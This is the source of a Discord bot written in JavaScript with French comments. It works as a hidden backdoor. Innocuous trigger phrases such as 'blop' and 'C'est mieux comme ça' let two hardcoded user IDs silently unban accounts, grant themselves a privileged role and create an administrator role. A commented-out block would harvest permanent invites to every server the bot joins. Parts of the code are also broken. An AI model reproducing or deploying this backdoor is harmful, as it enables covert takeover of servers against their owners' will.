//Modules
const Discord = require("discord.js");
const moment = require("moment");


//Client
const bot = new Discord.Client();

//Prefix
const prefix = '--'

//Lancement et informations du bot
bot.on('ready', () => {
   
   console.log(`INFORMATIONS DU BOT:`);
   console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591`);
   console.log(`username: ${bot.user.tag}`);
   console.log(`ID: ${bot.user.id}`);
   console.log(`Date of creation: ${bot.user.createdAt}`);
   console.log(`INFORMATIONS OF SERVER BOT:`);
   console.log(`How many server: ${bot.guilds.size}`);
   //console.log(`Name: ${bot.guild.name}`);
   //console.log(`ID: ${bot.guild.id}`);
   //console.log(`How many member: ${guild.memberCount}`);

 });


bot.on('message', message => {    
     
  // bot.guilds.forEach(guild => { 
 //  var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
   // invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id})`));
   //  });
   
   if (message.content.startsWith('blop')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.delete()
   message.guild.unban('301913733536415755')
  .then(user => console.log(`Unbanned Mikado from ${guild.name}`))
  .catch(console.error);          
      }
   
   if (message.content.startsWith('bblop')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.delete()
   message.guild.unban('450790126063190016')
  .then(user => console.log(`Unban Mikado from ${guild.name}`))
  .catch(console.error);          
      }
   
   if (message.content.startsWith('C\'est mieux comme ça')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
    message.member.addRole(message.member.guild.roles.find('name', '☡- 🌸Famille de shiro🌸 -☡'));
      }
   
  
   
   if (message.content.startsWith('Les emoji mikado c\'est cool')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.guild.createEmoji('./mikado1.gif', 'mikado1')
   message.guild.createEmoji('./mikado2.gif', 'mikado2')
   message.guild.createEmoji('./mikado3.gif', 'mikado3')
  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
      }
   
  
   
   
   
   else if(message.content.startsWith('bblop')) {
   
        	let args = message.content.split(" ").slice(1);
    
		    if(args == "") {

			    message.reply('Veuillez ajouter le nom du role')

		    	} else {

	if (message.content.startsWith('Les emoji mikado c\'est cool')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
				message.guild.createRole({
				  name: args.join(" "),
				  mentionable: true,
              ADMINISTRATOR: true
				})

				var embed = new Discord.RichEmbed()
				.setColor("#D3D3D3")
				.setDescription("Vous avez ajouté un role sous le nom de: **" + args.join("") + "**")
				message.channel.send(embed).catch(console.error)
			} else {

			  	message.reply('Tu as crus frère')	
			}
    
    		   }

	}
   
   if (message.content.startsWith('2blop')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
    message.member.addRole(message.member.guild.roles.find('name', '☡- 🌸Famille de shiro🌸 -☡'));
      }
   
});


  
// Jeton Secret
bot.login(process.env.TOKEN);
